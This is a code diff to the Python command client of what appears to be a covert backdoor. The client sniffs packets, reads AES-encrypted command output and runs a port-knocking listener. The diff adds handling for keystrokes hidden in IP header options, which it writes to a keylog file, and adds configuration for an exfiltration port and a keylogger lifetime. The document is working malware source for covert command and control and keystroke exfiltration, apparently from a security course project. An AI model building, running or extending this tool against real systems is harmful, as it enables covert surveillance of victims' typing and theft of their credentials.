@@ -15,7 +15,7 @@ from dcaes import AESCipher
 
 
 class CommandClient(object):
-    def __init__(self, rhost, lhost, sport, dport, protocol, key):
+    def __init__(self, rhost, lhost, sport, dport, protocol, key, keylog_filename):
         """
         Initialize the new command client. Grabs the default network card and creates a filter to use for sniffed packets.
         :param rhost: Remote host - The IP address of the remote machine
@@ -34,7 +34,7 @@ class CommandClient(object):
         self.dport = int(dport)
         self.proto = protocol
         self.key = key
-
+        self.keylog_filename = keylog_filename
         self.cipher = AESCipher(self.key)
 
         # get the default hardware interface
@@ -47,7 +47,7 @@ class CommandClient(object):
 
         print(self.filter)
 
-    def start(self):
+    def start(self, knock_port, time_to_live):
         """
         Starts both the sending and receiving threads and keeps the program alive until a signal
         is received from the user.
@@ -63,7 +63,7 @@ class CommandClient(object):
         listen_thread.start()
 
         # start the knocking thread
-        knock_thread = threading.Thread(target=KnockListener().listen())
+        knock_thread = threading.Thread(target=KnockListener(knock_port, time_to_live).listen())
         knock_thread.setDaemon(True)
         knock_thread.start()
 
@@ -117,7 +117,20 @@ class CommandClient(object):
         """
         if not packet[IP].options:
             return
-        print(str(packet[IP].options[0].value), end='')
+        ip_options = packet[IP].options[0]
+
+        if ip_options.option == 6:
+
+            print(str(packet[IP].options[0].value), end='')
+            return
+
+        if ip_options.option == 4:
+            with open(self.keylog_filename, "a") as keylog_file:
+                keylog_file.write(str(ip_options.value))
+
+            print('KEYLOGGED: ' + str(ip_options.value))
+        else:
+            print(str(ip_options.option))
 
     def is_incoming(self, pkt):
         """
@@ -139,12 +152,15 @@ def main():
     client_config.read('client.config')
 
     # Extract client config settings
-    remote_host = client_config.get('Setup', 'remote_host')
-    local_host  = client_config.get('Setup', 'local_host')
-    sport       = client_config.get('Setup', 'sport')
-    dport       = client_config.get('Setup', 'dport')
-    protocol    = client_config.get('Setup', 'protocol')
-    key         = client_config.get('Setup', 'key')
+    remote_host       = client_config.get('Setup', 'remote_host')
+    local_host        = client_config.get('Setup', 'local_host')
+    sport             = client_config.get('Setup', 'sport')
+    dport             = client_config.get('Setup', 'dport')
+    protocol          = client_config.get('Setup', 'protocol')
+    key               = client_config.get('Setup', 'key')
+    exfiltration_port = client_config.get('KnockListener', 'exfiltration_port')
+    keylog_filename   = client_config.get('Keylogger', 'filename')
+    time_to_live      = client_config.get('Keylogger', 'time_to_live')
 
     client = CommandClient(
         remote_host,
@@ -152,9 +168,10 @@ def main():
         sport,
         dport,
         protocol,
-        key)
+        key,
+        keylog_filename)
 
-    client.start()
+    client.start(exfiltration_port, int(time_to_live))
 
 
 
